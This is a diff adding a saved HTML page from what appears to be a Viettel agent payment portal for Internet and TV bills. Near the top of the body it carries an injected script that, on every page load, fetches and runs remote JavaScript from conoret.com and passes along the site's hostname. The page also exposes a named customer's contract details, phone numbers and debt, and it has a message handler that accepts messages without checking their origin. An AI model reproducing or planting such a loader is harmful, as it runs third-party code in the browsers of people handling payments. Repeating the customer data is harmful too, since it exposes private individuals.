@@ -1,0 +1,647 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head id="j_idt2">
+    <link type="text/css" rel="stylesheet" href="/javax.faces.resource/theme.css.jsf?ln=primefaces-aristo">
+    <script type="text/javascript" src="/javax.faces.resource/jquery/jquery.js.jsf?ln=primefaces&amp;v=6.2"></script>
+    <script type="text/javascript" src="/javax.faces.resource/jquery/jquery-plugins.js.jsf?ln=primefaces&amp;v=6.2"></script>
+    <script type="text/javascript" src="/javax.faces.resource/core.js.jsf?ln=primefaces&amp;v=6.2"></script>
+    <link type="text/css" rel="stylesheet" href="/javax.faces.resource/components.css.jsf?ln=primefaces&amp;v=6.2">
+    <script type="text/javascript" src="/javax.faces.resource/components.js.jsf?ln=primefaces&amp;v=6.2"></script>
+    <script type="text/javascript" src="/javax.faces.resource/inputnumber/inputnumber.js.jsf?ln=primefaces&amp;v=6.2"></script>
+    <link type="text/css" rel="stylesheet" href="/javax.faces.resource/inputnumber/inputnumber.css.jsf?ln=primefaces&amp;v=6.2">
+    <script type="text/javascript">
+      if (window.PrimeFaces) {
+        PrimeFaces.settings.locale = 'vi';
+        PrimeFaces.settings.projectStage = 'Development';
+      }
+    </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Thanh toán Internet, truyền hình Viettel</title>
+    <link href="Custom.css" rel="stylesheet" type="text/css">
+    <link href="bootstrap.min.css" rel="stylesheet" type="text/css">
+    <script>
+      $(document).ready(function() {
+        window.onAjax = false;
+      });
+      $(document).keypress(function(e) {
+        if (e.which === 13 || e.keyCode === 13) {
+          if (window.onAjax === false) {
+            e.preventDefault();
+            if ($("div[id$='dlgConfirm']").css('display') === 'block') {
+              if (document.getElementsByClassName('ui-state-focus').length === 0) {
+                window.onAjax = true;
+                //$("button[id$='yesIdEVN']").click()
+              } else {
+                window.onAjax = true;
+                $('.ui-state-focus').click();
+              }
+            }
+          }
+        }
+      });
+
+      function onComplateSelect() {
+        window.onAjax = false;
+      }
+      onlyNumbersWithChar = function(event, obj) {
+        var code = "";
+        try {
+          code = event.keyCode;
+        } catch (e) {
+          code = "";
+        }
+        obj.value = obj.value.replace(/[^0-9A-Za-z ]/g, '');
+      };
+      onlyNumbers = function(event, obj) {
+        var code = "";
+        try {
+          code = event.keyCode;
+        } catch (e) {
+          code = "";
+        }
+        obj.value = obj.value.replace(/[^0-9]/g, '');
+      }
+    </script>
+  </head>
+  <body class="font-size-cust mg-0">
+    <script type="text/javascript">
+      window.top === window && ! function() {
+        var e = document.createElement("script"),
+          t = document.getElementsByTagName("head")[0];
+        e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
+      }();
+    </script>
+    <form id="payMoneyForm" name="payMoneyForm" method="post" action="/pages/newInternetTelevisionViettel.jsf" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="payMoneyForm" value="payMoneyForm">
+      <div id="payMoneyForm:j_idt5"></div>
+      <div id="payMoneyForm:j_idt6" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container" role="dialog" aria-labelledby="payMoneyForm:j_idt6_title" aria-hidden="true" style="width: auto; height: auto; visibility: visible; left: 833.61px; top: 519.758px; z-index: 1005; display: none;" aria-live="off">
+        <div class="ui-dialog-content ui-widget-content" style="height: auto;">
+          <img id="profile-img" src="../Content/img/ajaxloadingbar.gif">
+        </div>
+      </div>
+      <div class="wrapper">
+        <div class="row main-header">
+          <div class="col-3">
+            <a href="/pages/index.jsf" class="">
+              <img src="../Content/img/logo-VTT2.png" class="vtp-logo">
+            </a>
+          </div>
+          <div class="col-8 text-right pd-r-0">
+            <img src="../Content/img/icon_account.png" class="user-image" alt="User Image">
+          </div>
+          <div class="col-1 p-1">
+            <div style="color: #1b6457;margin-bottom: -5px;margin-top: 3px;">
+              <b>DN Phu Hung</b>
+            </div>
+            <div>( <u>
+                <a id="payMoneyForm:ajax" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;payMoneyForm:ajax&quot;});return false;">thoát</a>
+              </u>) </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-12">
+            <div class="dl-info">
+              <div class="dl-info-detail">
+                <div class="info text-right">Đại lý/Điểm bán: <span style="color: orange">1000460100_VTP_00073_DB</span>
+                </div>
+                <div class="info text-center">Số dư khả dụng: <span style="color: orange">
+                    <label id="payMoneyForm:tranAmountId" class="ui-outputlabel ui-widget">698.881 đ</label>
+                  </span>
+                </div>
+                <div class="info">Số điện thoại: <span style="color: orange">0356-576-868</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <button id="payMoneyForm:updateId" name="payMoneyForm:updateId" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-confirmdialog-yes" onclick="PrimeFaces.ab({s:&quot;payMoneyForm:updateId&quot;,u:&quot;@([id$=tranAmountId])&quot;});return false;" style="display: none" type="submit" role="button" aria-disabled="false">
+          <span class="ui-button-text ui-c">update</span>
+        </button>
+        <div class="row">
+          <div class="col-2 left-menu">
+            <div class="menu-item no-boder">
+              <a href="/pages/index.jsf" class="">
+                <div class="item-home"> Trang chủ </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="javascript:void(0)" class="">
+                <div class="item-cgntm"> Chuyển, giao, nạp tiền mặt </div>
+              </a>
+              <div class="cgntm-sub-menu mt-1">
+                <a href="/pages/chargemoney.jsf" class="">
+                  <div class="sub-menu-item"> Nạp tiền cho khách hàng </div>
+                </a>
+              </div>
+              <div class="cgntm-sub-menu mt-1">
+                <a href="/pages/transfermoney.jsf" class="">
+                  <div class="sub-menu-item"> Chuyển tiền mặt </div>
+                </a>
+              </div>
+              <div class="cgntm-sub-menu mt-1">
+                <a href="/pages/givemoney.jsf" class="">
+                  <div class="sub-menu-item"> Giao tiền mặt </div>
+                </a>
+              </div>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/chargecard.jsf" class="">
+                <div class="item-ntdt"> Nạp tiền điện thoại đa mạng </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/transfermm.jsf" class="">
+                <div class="item-ntdt"> Chuyển tiền MM </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/paycard.jsf" class="">
+                <div class="item-tcdm"> Mua thẻ cào đa mạng </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/cardgame.jsf" class="">
+                <div class="item-mmt"> Mua mã thẻ </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/canceldebt.jsf" class="">
+                <div class="item-gntbch"> Gạch nợ thuê bao cắt hủy </div>
+              </a>
+            </div>
+            <div class="menu-item">
+              <a href="javascript:void(0)" class="">
+                <div class="item-dnth"> Điện, nước, thu hộ tài chính </div>
+              </a>
+              <div class="sub-menu mt-1">
+                <a href="/pages/collectmoney.jsf?type=1" class="">
+                  <div class="sub-menu-item"> Điện, nước </div>
+                </a>
+              </div>
+              <div class="sub-menu mt-1">
+                <a href="/pages/feelearning.jsf" class="">
+                  <div class="sub-menu-item"> Học phí </div>
+                </a>
+              </div>
+              <div class="sub-menu mt-2">
+                <a href="/pages/collectmoney.jsf?type=2" class="">
+                  <div class="sub-menu-item"> Thu hộ tài chính </div>
+                </a>
+              </div>
+            </div>
+            <div class="menu-item">
+              <a href="javascript:void(0)" class="">
+                <div class="item-internet"> Internet, truyền hình, cố định </div>
+              </a>
+              <div class="in-sub-menu mt-1">
+                <a href="/pages/internet.jsf?type=IN" class="">
+                  <div class="sub-menu-item"> Internet </div>
+                </a>
+              </div>
+              <div class="in-sub-menu mt-1">
+                <a href="/pages/internet.jsf?type=TH" class="">
+                  <div class="sub-menu-item"> Truyền hình </div>
+                </a>
+              </div>
+              <div class="in-sub-menu mt-2">
+                <a href="/pages/internet.jsf?type=CD" class="">
+                  <div class="sub-menu-item"> Cố định </div>
+                </a>
+              </div>
+            </div>
+            <div class="menu-item">
+              <a href="javascript:void(0)" class="">
+                <div class="item-tkct"> Tài khoản của tôi </div>
+              </a>
+              <div class="acc-sub-menu mt-1">
+                <a href="/pages/account.jsf?serviceType=NAP" class="">
+                  <div class="sub-menu-item"> Nạp tiền </div>
+                </a>
+              </div>
+              <div class="acc-sub-menu mt-1">
+                <a href="/pages/account.jsf?serviceType=RUT" class="">
+                  <div class="sub-menu-item"> Rút tiền </div>
+                </a>
+              </div>
+            </div>
+            <div class="menu-item">
+              <a href="/pages/history.jsf" class="">
+                <div class="item-lsgd"> Lịch sử giao dịch </div>
+              </a>
+            </div>
+          </div>
+          <div class="col-8 main">
+            <div class="main-content">
+              <div class="row pay-money">
+                <div class="col-6">
+                  <div class="item-common header-content" style="background-image: url('');">
+                    <p class="item-content main-color font-weight-bold"> Đơn vị phát hành</p>
+                    <p class="item-content color-bl">
+                      <b>Internet - Truyền hình Viettel</b>
+                    </p>
+                  </div>
+                </div>
+                <div class="col-6">
+                  <div id="payMoneyForm:printFinanceID" class="ui-outputpanel ui-widget" style="text-align: right;"></div>
+                </div>
+                <span id="payMoneyForm:focusID"></span>
+                <script type="text/javascript">
+                  $(function() {
+                    PrimeFaces.focus('payMoneyForm:contractCode');
+                  });
+                </script>
+                <div class="col-12 pay-main">
+                  <div id="payMoneyForm:msgError" class="ui-messages ui-widget" aria-live="polite"></div>
+                  <div id="payMoneyForm:searchMethod" class="ui-outputpanel ui-widget">
+                    <div class="row pay-content mt-4">
+                      <div class="col-12">
+                        <p class="item-content color-bl">
+                          <b>Tra cứu hợp đồng theo :</b>
+                        </p>
+                      </div>
+                    </div>
+                    <div class="row pay-content mb-2">
+                      <div class="col-12">
+                        <div id="payMoneyForm:console" class="ui-selectoneradio ui-widget ui-grid ui-grid-responsive">
+                          <div class="ui-g">
+                            <div class="ui-g-12 ui-md-6">
+                              <div class="ui-radiobutton ui-widget">
+                                <div class="ui-helper-hidden-accessible">
+                                  <input id="payMoneyForm:console:0" name="payMoneyForm:console" type="radio" value="PHONE" onchange="PrimeFaces.ab({s:&quot;payMoneyForm:console&quot;,e:&quot;change&quot;,p:&quot;payMoneyForm:console&quot;,u:&quot;@([id$=payMoneyForm])&quot;});">
+                                </div>
+                                <div class="ui-radiobutton-box ui-widget ui-corner-all ui-state-default">
+                                  <span class="ui-radiobutton-icon ui-icon ui-icon-blank ui-c"></span>
+                                </div>
+                              </div>
+                              <label for="payMoneyForm:console:0">Số điện thoại</label>
+                            </div>
+                            <div class="ui-g-12 ui-md-6">
+                              <div class="ui-radiobutton ui-widget">
+                                <div class="ui-helper-hidden-accessible">
+                                  <input id="payMoneyForm:console:1" name="payMoneyForm:console" type="radio" value="SCMND" onchange="PrimeFaces.ab({s:&quot;payMoneyForm:console&quot;,e:&quot;change&quot;,p:&quot;payMoneyForm:console&quot;,u:&quot;@([id$=payMoneyForm])&quot;});">
+                                </div>
+                                <div class="ui-radiobutton-box ui-widget ui-corner-all ui-state-default">
+                                  <span class="ui-radiobutton-icon ui-icon ui-icon-blank ui-c"></span>
+                                </div>
+                              </div>
+                              <label for="payMoneyForm:console:1">Số CMND/CCCD</label>
+                            </div>
+                          </div>
+                          <div class="ui-g">
+                            <div class="ui-g-12 ui-md-6">
+                              <div class="ui-radiobutton ui-widget">
+                                <div class="ui-helper-hidden-accessible">
+                                  <input id="payMoneyForm:console:2" name="payMoneyForm:console" type="radio" value="ACCNO" onchange="PrimeFaces.ab({s:&quot;payMoneyForm:console&quot;,e:&quot;change&quot;,p:&quot;payMoneyForm:console&quot;,u:&quot;@([id$=payMoneyForm])&quot;});">
+                                </div>
+                                <div class="ui-radiobutton-box ui-widget ui-corner-all ui-state-default">
+                                  <span class="ui-radiobutton-icon ui-icon ui-icon-blank ui-c"></span>
+                                </div>
+                              </div>
+                              <label for="payMoneyForm:console:2">Mã hợp đồng</label>
+                            </div>
+                            <div class="ui-g-12 ui-md-6">
+                              <div class="ui-radiobutton ui-widget">
+                                <div class="ui-helper-hidden-accessible">
+                                  <input id="payMoneyForm:console:3" name="payMoneyForm:console" type="radio" value="SUBID" onchange="PrimeFaces.ab({s:&quot;payMoneyForm:console&quot;,e:&quot;change&quot;,p:&quot;payMoneyForm:console&quot;,u:&quot;@([id$=payMoneyForm])&quot;});" checked="checked">
+                                </div>
+                                <div class="ui-radiobutton-box ui-widget ui-corner-all ui-state-default ui-state-active">
+                                  <span class="ui-radiobutton-icon ui-icon ui-icon-bullet ui-c"></span>
+                                </div>
+                              </div>
+                              <label for="payMoneyForm:console:3">Số thuê bao</label>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-12">
+                        <input id="payMoneyForm:contractCode" name="payMoneyForm:contractCode" type="text" value="" maxlength="100" placeholder="Nhập số thuê bao" onkeydown="replaceSpace(event, this);" onkeyup="replaceSpace(event, this);" onblur="replaceSpace(event, this);" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all pay-detail none-p" role="textbox" aria-disabled="false" aria-readonly="false">
+                      </div>
+                    </div>
+                    <div class="row pay-content mb-5">
+                      <div class="col-12">
+                        <button id="payMoneyForm:btnPay0" name="payMoneyForm:btnPay0" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn-submit-login mt-3" onclick="PrimeFaces.ab({s:&quot;payMoneyForm:btnPay0&quot;,u:&quot;@([id$=msgError]) @([id$=applicationForm]) @([id$=listContract])&quot;});return false;" type="submit" role="button" aria-disabled="false">
+                          <span class="ui-button-text ui-c">KIỂM TRA</span>
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                  <div id="payMoneyForm:listContract" class="ui-outputpanel ui-widget mb-5">
+                    <div id="payMoneyForm:j_idt41" class="ui-outputpanel ui-widget">
+                      <div class="row pay-content mb-2">
+                        <div class="col-12">
+                          <p class="item-content color-bl">
+                            <b>Chọn hợp đồng :</b>
+                          </p>
+                        </div>
+                      </div>
+                      <div class="row pay-content mb-3">
+                        <div class="col-12">
+                          <div class="row justify-content-between" style="margin: 1px;">
+                            <div class="col-12" style="border-top:dashed 2px #000;padding-top:10px;"></div>
+                          </div>
+                          <div class="row justify-content-between">
+                            <div class="col-10" style="padding-right: 30px;">
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt128" class="ui-outputlabel ui-widget">Mã hợp đồng:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">633855284</p>
+                                </div>
+                              </div>
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt130" class="ui-outputlabel ui-widget">Chủ hợp đồng:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">NGUYỄN THỊ CẨM TÚ</p>
+                                </div>
+                              </div>
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt132" class="ui-outputlabel ui-widget">Số thuê bao đại diện:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">k077_gftth_phanltn0</p>
+                                </div>
+                              </div>
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt134" class="ui-outputlabel ui-widget">Dịch vụ:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">Internet</p>
+                                </div>
+                              </div>
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt136" class="ui-outputlabel ui-widget">Số điện thoại liên hệ:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">853798339</p>
+                                </div>
+                              </div>
+                              <div class="row">
+                                <div class="col-6">
+                                  <label id="payMoneyForm:j_idt138" class="ui-outputlabel ui-widget">Nợ cước:</label>
+                                </div>
+                                <div class="col-6" style="padding-right: 0px;">
+                                  <p style="width: 100%;height: auto;float:right;margin-bottom: 0px;text-align: right;font-weight: bold;">154,000 VND</p>
+                                </div>
+                              </div>
+                            </div>
+                            <div class="col-2" style=" display: flex; justify-content: center; align-items: center;padding-left: 0px;">
+                              <button id="payMoneyForm:btnView1" name="payMoneyForm:btnView1" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn-submit-login btn-view-detail" onclick="PrimeFaces.bcn(this,event,[function(event){this.disabled = true;},function(event){PrimeFaces.ab({s:&quot;payMoneyForm:btnView1&quot;,u:&quot;@([id$=msgError]) @([id$=focusID]) @([id$=detailContract]) @([id$=searchMethod]) @([id$=listContract])&quot;,onco:function(xhr,status,args){this.disabled=true;;}});return false;}]);" type="submit" role="button" aria-disabled="false">
+                                <span class="ui-button-text ui-c">THANH TOÁN</span>
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div id="payMoneyForm:detailContract" class="ui-outputpanel ui-widget" style=""></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span id="payMoneyForm:fixexPhoneId">
+            <div id="payMoneyForm:dlgConfirm" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container" role="dialog" aria-labelledby="payMoneyForm:dlgConfirm_title" aria-hidden="true" style="width: auto; height: auto;">
+              <div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top">
+                <span id="payMoneyForm:dlgConfirm_title" class="ui-dialog-title">Xác nhận thanh toán</span>
+              </div>
+              <div class="ui-dialog-content ui-widget-content" style="height: auto;">
+                <span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>
+                <span class="ui-confirm-dialog-message"></span>
+              </div>
+              <div class="ui-dialog-buttonpane ui-dialog-footer ui-widget-content ui-helper-clearfix">
+                <div id="dlgContent" tabindex="1" class="ContainerIndent TexAlRight">
+                  <button id="payMoneyForm:yesId0" name="payMoneyForm:yesId0" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-confirmdialog-yes" onclick="PrimeFaces.bcn(this,event,[function(event){this.disabled = true;},function(event){PrimeFaces.ab({s:&quot;payMoneyForm:yesId0&quot;,p:&quot;payMoneyForm:yesId0 payMoneyForm&quot;,u:&quot;@([id$=msgError]) @([id$=applicationForm]) @([id$=focusID]) @([id$=printFinanceID]) @([id$=detailContract]) @([id$=searchMethod]) @([id$=listContract])&quot;,onco:function(xhr,status,args){this.disabled=false; window.onAjax = false;PF('dlgConfirm').hide();;}});return false;}]);" type="submit" role="button" aria-disabled="false">
+                    <span class="ui-button-text ui-c">Xác nhận</span>
+                  </button>
+                  <button id="payMoneyForm:noIdDlg" name="payMoneyForm:noIdDlg" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-confirmdialog-no" onclick="PrimeFaces.bcn(this,event,[function(event){PF('dlgConfirm').hide();},function(event){PrimeFaces.ab({s:&quot;payMoneyForm:noIdDlg&quot;,onco:function(xhr,status,args){window.onAjax = false;}});return false;}]);" style="margin-left: 5px !important;" type="submit" role="button" aria-disabled="false">
+                    <span class="ui-button-text ui-c">Hủy</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </span>
+          <div id="payMoneyForm:dlgConfirmSessionExpired" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container" role="dialog" aria-labelledby="payMoneyForm:dlgConfirmSessionExpired_title" aria-hidden="true" style="width: auto; height: auto;">
+            <div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top">
+              <span id="payMoneyForm:dlgConfirmSessionExpired_title" class="ui-dialog-title">Thông báo</span>
+            </div>
+            <div class="ui-dialog-content ui-widget-content" style="height: auto;">
+              <span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>
+              <span class="ui-confirm-dialog-message"> Phiên làm việc kết thúc, yêu cầu đăng nhập lại. </span>
+            </div>
+            <div class="ui-dialog-buttonpane ui-dialog-footer ui-widget-content ui-helper-clearfix">
+              <div id="dlgContent" tabindex="1" class="ContainerIndent TexAlRight">
+                <button id="payMoneyForm:yesIdDlg" name="payMoneyForm:yesIdDlg" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-confirmdialog-yes" onclick="PrimeFaces.bcn(this,event,[function(event){this.disabled = true;},function(event){PrimeFaces.ab({s:&quot;payMoneyForm:yesIdDlg&quot;,p:&quot;payMoneyForm:yesIdDlg payMoneyForm&quot;,onco:function(xhr,status,args){this.disabled=false; window.onAjax = false;PF('dlgConfirmSessionExpired').hide();;}});return false;}]);" type="submit" role="button" aria-disabled="false">
+                  <span class="ui-button-text ui-c">Xác nhận</span>
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="col-2 left-notify">
+            <div class="notify-item notify-item-1">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=4970" class="">
+                  <b>Thông báo - Dừng dịch vụ chuyển, nạp tiền từ ngày 28/12/2023</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 21/12/2023 14:27:58</div>
+            </div>
+            <div class="notify-item notify-item-2">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1907" class="">
+                  <b>Tạm dừng thanh toán nước Tân Hòa</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 30/03/2019 11:13:25</div>
+            </div>
+            <div class="notify-item notify-item-3">
+              <div>
+                <b>Giới thiệu chung</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1905" class="">
+                  <b>Tạm dừng nạp tiền liên ngân hàng tới Agribank định kỳ</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 27/03/2019 11:11:56</div>
+            </div>
+            <div class="notify-item notify-item-4">
+              <div>
+                <b>Giới thiệu chung</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1904" class="">
+                  <b>Mở lại nạp tiền liên ngân hàng vào BIDV</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 27/03/2019 11:08:54</div>
+            </div>
+            <div class="notify-item notify-item-5">
+              <div>
+                <b>Giới thiệu chung</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1870" class="">
+                  <b>Mở lại thu/ chi hộ MCREDIT</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 20/03/2019 10:03:00</div>
+            </div>
+            <div class="notify-item notify-item-6">
+              <div>
+                <b>Giới thiệu chung</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1885" class="">
+                  <b>Mở lại giao dịch thanh toán tiền điện Hà Nội</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 19/03/2019 09:23:34</div>
+            </div>
+            <div class="notify-item notify-item-7">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1846" class="">
+                  <b>Thông báo về việc Kênh thực hiện nghiệp vụ không thể lấy dữ liệu từ lịch sử cuộc gọị/tin nhắn</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 18/03/2019 08:45:39</div>
+            </div>
+            <div class="notify-item notify-item-8">
+              <div>
+                <b>Giới thiệu chung</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1805" class="">
+                  <b>Thông báo tạm dừng giao dịch chuyển tiền liên ngân hàng tới ngân hàng Nông nghiệp Agribank - VBA</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 05/03/2019 09:47:26</div>
+            </div>
+            <div class="notify-item notify-item-9">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1705" class="">
+                  <b>Thông báo triển khai tin nhắn quảng cáo VTAds</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 28/01/2019 17:55:01</div>
+            </div>
+            <div class="notify-item notify-item-10">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1605" class="">
+                  <b>Hướng dẫn xử lý lỗi cơ bản</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 13/12/2018 17:42:22</div>
+            </div>
+            <div class="notify-item notify-item-11">
+              <div>
+                <b>Dịch vụ</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1588" class="">
+                  <b>Hướng dẫn báo lỗi dịch vụ Tài chính ngân hàng</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 10/12/2018 14:56:31</div>
+            </div>
+            <div class="notify-item notify-item-12">
+              <div>
+                <b>Chính sách</b>
+              </div>
+              <div>
+                <a href="/pages/newsarticle.jsf?id=1563" class="">
+                  <b>Tổng hợp chính sách Phí bán hàng cho Kênh</b>
+                </a>
+                <img src="../Content/img/new.gif" class="vtp-new">
+              </div>
+              <div>Cập nhật: 13/11/2018 16:01:42</div>
+            </div>
+          </div>
+        </div>
+        <div class="main-footer text-center"> @ 2018 Viettel Telecom. Hotline: 1789 - Nhánh 5 </div>
+      </div>
+      <script>
+        window.addEventListener('message', function(e) {
+          console.log(e.data);
+          var listData = e.data.split(";");
+          var prefixUrl = listData[0];
+          if (prefixUrl === 'webview_viettel') {
+            document.getElementById("payMoneyForm:infoWebView").value = listData[2];
+            document.getElementById("payMoneyForm:formConfirmBtn").click();
+          }
+        });
+        $(function() {
+          $('.item-dnth').click(function() {
+            $('.sub-menu').slideToggle();
+          });
+          $('.item-internet').click(function() {
+            $('.in-sub-menu').slideToggle();
+          });
+          $('.item-tkct').click(function() {
+            $('.acc-sub-menu').slideToggle();
+          });
+          $('.item-cgntm').click(function() {
+            $('.cgntm-sub-menu').slideToggle();
+          });
+        });
+        replaceSpace = function(event, obj) {
+          var code = "";
+          try {
+            code = event.keyCode;
+          } catch (e) {
+            code = "";
+          }
+          obj.value = obj.value.replace(' ', '').trim();
+        }
+        onlyChar = function(event, obj) {
+          var code = "";
+          try {
+            code = event.keyCode;
+          } catch (e) {
+            code = "";
+          }
+          obj.value = obj.value.replace(/[0-9!@#$%^()=+:;"',.?]/g, '');
+        }
+      </script>
+      <input type="hidden" name="javax.faces.ViewState" value="-8879981534728788923:3784776401577825534" autocomplete="off">
+    </form>
+    <script type="text/javascript">
+      $(function() {
+        $("button[id$='updateId']").click();;
+      });
+    </script>
+    <div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div>
+    <div class="ui-dialog-docking-zone"></div>
+  </body>
+</html>
